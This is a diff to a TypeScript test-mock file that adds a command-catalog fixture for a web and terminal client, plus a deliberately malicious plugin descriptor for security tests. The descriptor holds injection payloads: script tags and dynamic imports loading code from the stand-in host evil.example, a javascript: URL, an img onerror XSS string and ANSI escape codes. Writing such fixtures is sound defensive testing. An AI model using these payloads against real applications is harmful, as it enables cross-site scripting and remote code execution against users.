@@ -5,6 +5,59 @@
  */
 
 import { http, HttpResponse } from 'msw';
+import type { CommandExperienceEntryV1 } from '@yeisme/dsh-client-ui-command-experience-core';
+
+export function commandFixture(
+  partial: Partial<CommandExperienceEntryV1> & Pick<CommandExperienceEntryV1, 'canonicalName'>,
+): CommandExperienceEntryV1 {
+  return {
+    aliases: [],
+    description: `${partial.canonicalName} command`,
+    category: 'session',
+    input: {},
+    surfaces: ['web', 'tui'],
+    actionKind: 'owner-action',
+    owner: 'dsh',
+    danger: 'safe',
+    availability: { state: 'available' },
+    coverage: 'equivalent',
+    ...partial,
+  };
+}
+
+export const WEB_COMMAND_CATALOG: CommandExperienceEntryV1[] = [
+  commandFixture({ canonicalName: 'help', category: 'discovery', actionKind: 'local', owner: 'client', description: 'Show command help' }),
+  commandFixture({ canonicalName: 'agent', description: 'Switch agent or thread', input: { selectorKey: 'threadRef' } }),
+  commandFixture({ canonicalName: 'resume', description: 'Resume a saved session', input: { selectorKey: 'sessionId' } }),
+  commandFixture({ canonicalName: 'rename', description: 'Rename the current session', input: { schemaKey: 'title' } }),
+  commandFixture({
+    canonicalName: 'status',
+    category: 'discovery',
+    actionKind: 'inspect',
+    availability: { state: 'disabled', reason: 'System status projection not available' },
+  }),
+  commandFixture({
+    canonicalName: 'archive',
+    danger: 'confirm',
+    coverage: 'staged',
+    availability: { state: 'disabled', reason: 'Owner preview is unavailable' },
+  }),
+  commandFixture({
+    canonicalName: 'delete',
+    danger: 'destructive',
+    coverage: 'staged',
+    availability: { state: 'disabled', reason: 'Owner preview is unavailable' },
+  }),
+];
+
+export const MALICIOUS_PLUGIN_DESCRIPTOR = {
+  description: '\u001b[31m<pwned>\u001b[0m <script src="https://evil.example/x.js"></script> import("https://evil.example/x.js")',
+  icon: 'javascript:alert(1)',
+  category: '<img src=x onerror=eval(1)>',
+  shortcut: 'globalShortcut.register("Ctrl+Alt+X")',
+  importSpecifier: 'https://evil.example/plugin.js',
+  execute: () => 'must-not-run',
+};
 
 // Base URL for DSH owner action API
 const BASE_URL = 'https://api.deepseek.com/v1';
